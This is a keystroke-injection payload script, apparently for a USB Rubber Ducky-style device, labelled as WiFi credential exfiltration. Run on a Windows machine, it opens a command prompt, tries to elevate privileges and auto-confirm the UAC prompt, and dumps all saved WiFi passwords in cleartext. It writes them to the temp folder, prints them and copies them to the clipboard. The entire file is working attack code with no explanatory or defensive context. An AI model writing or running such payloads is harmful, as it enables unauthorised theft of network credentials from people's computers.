REM ========================================
REM WiFi Credential Exfiltration
REM Extracts saved WiFi passwords
REM ========================================

DELAY 2000

REM Open Run dialog
GUI r
DELAY 500

REM Open Command Prompt as admin workaround
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 2000

REM Accept UAC if needed (may require user interaction)
ALT y
DELAY 1000

REM Export WiFi profiles
STRING netsh wlan export profile key=clear folder="%TEMP%"
ENTER
DELAY 2000

REM Show WiFi passwords inline
STRING for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr Profile') do @netsh wlan show profile name=%a key=clear | findstr "SSID Key"
ENTER
DELAY 3000

REM Copy to clipboard alternative
STRING powershell "netsh wlan show profiles | Select-String 'Profile' | ForEach-Object { $_.ToString().Split(':')[1].Trim() } | ForEach-Object { $ssid=$_; $key=(netsh wlan show profile name=$ssid key=clear | Select-String 'Key Content').ToString().Split(':')[1].Trim(); Write-Host $ssid : $key }" | clip
ENTER
DELAY 1000

REM Clean up and exit
STRING exit
ENTER
